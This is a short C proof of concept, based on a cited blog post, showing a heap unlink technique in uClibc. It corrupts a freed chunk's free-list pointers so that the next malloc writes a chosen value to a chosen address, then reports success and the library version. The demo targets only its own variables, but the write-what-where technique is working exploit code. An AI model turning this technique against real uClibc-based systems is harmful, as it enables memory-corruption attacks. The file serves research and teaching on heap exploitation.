// Based on
// https://blog.infosectcbr.com.au/2019/11/uclibc-unlink-heap-exploitation.html
// by Dr Silvio Cesare

#include <limits.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

#ifndef __UCLIBC__
#error "Wrong libc - needs uClibc"
#endif

struct heap_free_area {
  size_t size;
  struct heap_free_area *next, *prev;
};

long * where;
long what;

int main() {

  char * p = malloc(10);
  char * q = malloc(10);

  // Insert into free list
  free(p);

  where = NULL;
  what = 0x41414141424242;

  size_t offset = sizeof(void *);
  struct heap_free_area * fa1 = (void *)(p - offset);
  fa1->prev = (void *)&what;        // What
  fa1->next = (void *)(&where - 2); // Where

  q = malloc(10); // write-what-where

  if (where) {
    printf("Target overwritten, points to value %lx\n", *where);
  } else {
    printf("Target NOT overwritten - uClibc major version %d, minor "
           "version %d, sublevel %d\n",
           __UCLIBC_MAJOR__,
           __UCLIBC_MINOR__,
           __UCLIBC_SUBLEVEL__);
  }
}